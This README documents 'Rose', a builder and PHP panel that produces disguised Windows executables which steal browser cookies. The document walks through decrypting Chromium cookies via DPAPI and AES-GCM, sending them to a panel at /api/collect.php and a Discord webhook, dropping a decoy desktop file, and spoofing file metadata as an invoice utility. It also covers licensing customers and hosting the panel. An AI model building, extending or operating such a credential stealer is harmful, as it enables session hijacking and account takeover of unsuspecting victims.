# Rose

Builder app plus PHP panel. The app compiles a standalone `.exe` from an
embedded stub; that exe collects cookies from the browsers installed on the
machine that runs it and reports them to the panel.

```
RoseBuild/            admin app (C#, WinForms, no external dependencies)
  build.ps1           one-command build -> dist/Rose.exe
  src/                app sources
  src/stub/           collector stub compiled into every build
  panel/              PHP panel (SQLite, no composer, no framework)
  dist/Rose.exe       built app
```

## Build the app

```
powershell -ExecutionPolicy Bypass -File RoseBuild\build.ps1
```

Needs only `csc.exe` from .NET Framework 4.x, which every Windows 10/11 box
already has. Output: `RoseBuild\dist\Rose.exe`, ~68 KB.

## Use the app

1. `Rose.exe` starts on **Builder**. Click **Account** to open settings.
2. **Panel URL** - base URL of the PHP panel, for example
   `https://panel.example.com`. The app calls
   `<base>/api/license.php` and `<base>/api/build.php`.
3. **Discord webhook** - optional. Build notifications from the app, capture
   notifications from the panel. `Test webhook` fires one message.
4. **License key** - issued in the panel under **Licenses**. Keys bind to the
   first device that presents them. Leave empty to run unlicensed; the key
   only gates the app, never the collector.
5. **Build output folder** - defaults to `%USERPROFILE%\Desktop\builds`.
6. Fill **Executable customization** and **Executable information**, then
   press **Start Builder**.

What lands in the output folder is a real PE executable with:

| field | lands in |
|---|---|
| Executable name / Extension | file name and `/out` target |
| Executable icon | `RT_GROUP_ICON` via `/win32icon` |
| File description | `VS_VERSIONINFO` /FileDescription |
| Product name | /ProductName |
| Company | /CompanyName |
| File version | /FileVersion and the fixed version block |
| Product version | /ProductVersion (informational) |
| Copyright | /LegalCopyright |

Values are emitted as assembly attributes and compiled in, so Explorer,
Task Manager and the file properties dialog all show them. Removing the
icon or leaving a version field empty falls back to a 1.0.0.0 block.

The build log under the button prints the exact `csc` command line and then
reads the version block back out of the produced file, so a metadata miss
shows up immediately.

## What the built exe does

1. Console window opens, collects, closes. Roughly one second on an idle
   machine, longer when there are big cookie stores.
2. Writes `<name>.txt` to the desktop, so the run looks like a completed
   download.
3. `POST`s the collection as JSON to `<panel>/api/collect.php`.
4. `POST`s a one-line summary to the Discord webhook if one was set.

Collection covers Chromium-family stores (Chrome, Edge, Brave, Opera, Vivaldi,
Yandex - `Default` and every `Profile N`) and Firefox profiles.

- Cookie databases are copied to `%TEMP%` first; a live database cannot be
  opened read-only by a second process, and the copy keeps the trail clean.
- Chromium values: read `Local State` -> `os_crypt.encrypted_key`, strip the
  5-byte `DPAPI` prefix, unwrap with DPAPI, then AES-256-GCM per cookie
  (`v10`/`v11` prefix, 12-byte nonce, 16-byte tag). The tag is verified; a
  tampered value is dropped rather than reported as garbage.
- SQLite is `winsqlite3.dll`, which ships with Windows. No payload DLL.
- A store that fails is skipped; one locked browser never stops the run.

APPDATA is per-user, so the exe only sees stores it can already read - no
privilege escalation, no admin prompt.

## Panel

Copy `panel/` to the web root, then:

1. Open `setup.php`, set the admin user, a password of 10+ characters, and
   optionally the Discord webhook. It writes `config.php`.
2. **Delete `setup.php`.**
3. Sign in at `login.php`.

Requirements: PHP 7.4+ with `pdo_sqlite`. `curl` is used when present, with a
stream fallback when it is not. No composer, no migrations to run - the schema
builds itself on first request into `data/panel.sqlite`.

Pages:

- **Captures** - every collection, newest first, with totals across the top.
  Open one to see the source machine, address, user agent and every cookie
  grouped by browser and domain, each value with a copy button.
- **Builds** - one row per successful build posted by the app.
- **Licenses** - issue keys, set plan and expiry, unbind a device, disable or
  delete. A key with no device binds to the first one that asks.
- **Settings** - the exact endpoints to paste into the app, plus webhook and a
  test message button.

`data/` ships with an Apache deny rule; `config.php` and `lib/` are blocked
too. On nginx or IIS, deny `config.php`, `lib/` and `data/` by hand.

## API

```
POST /api/license.php   {"key":"ROSE-...","hwid":"A1B2..."}
                        -> {"active":true,"plan":"standard","expires":"2027-06-30","message":"active"}

POST /api/build.php     {"event":"build","hwid":"...","name":"x","file":"x.exe","size":17920,"version":"2.4.1.0"}
                        -> {"ok":true}

POST /api/collect.php   {"tag":"r...","app":"...","user":"...","machine":"...","at":"...","cookies":[ ... ]}
                        -> {"ok":true,"count":37}
```

`collect.php` caps at 20,000 cookies per post and 4 MB per request; oversized
bodies are refused rather than truncated.

## Verified

- `Rose.exe` builds from `build.ps1`, launches, writes
  `%APPDATA%\Rose\config.ini`.
- Stub compiles through the app path: 17,920-byte exe, metadata read back as
  designed (`desc="Invoice tracking utility" product="Invoice Tracker"
  company="Northwind Traders" file=2.4.1.0`).
- Built exe runs in ~1.0 s, drops the desktop file, exits 0.
- Built exe posts to a live panel: capture row appears with the right tag and
  application name.
- Panel: setup, login, CSRF, unauthenticated redirect, key issue, first-bind,
  second-device rejection, build log, capture ingest, dashboard and per-cookie
  detail all exercised against PHP 8.3 with `pdo_sqlite`.
- AES-256-GCM passes NIST GCM test case 13; SQL layer reads real Chromium
  stores (15, 5 and 1 rows on the local machine).

## Repository

`https://github.com/silidev2025/beam` (branch `master`)

```
cd "C:\Users\User\Documents\Default Project\RoseBuild"
git add -A
git commit -m "what changed"
git push
```

`panel/config.php` and the SQLite database are ignored on purpose - the webhook
and the admin hash must never land in a public repo.

## Hosting the panel

GitHub Pages cannot run this: Pages serves static files only, and the panel is
PHP with a database. GitHub holds the source, not the web server.

Working options:

- any cPanel-style PHP host (PHP 7.4+, `pdo_sqlite`) - upload `panel/` into
  `public_html` or a subfolder, then open `setup.php`
- a small VPS - `apt install php-fpm nginx`, root pointed at `panel/`
- a container host with a PHP image, for example `php:8.3-apache` with
  `pdo_sqlite` enabled, `panel/` mounted at `/var/www/html`
- a Codespace for a short-lived test - `php -S 0.0.0.0:8080 -t panel` with the
  port made public; the URL dies when the Codespace stops

Whichever host you pick, paste its base URL into the app under
**Account -> Panel URL**; the collector posts to `<base>/api/collect.php`.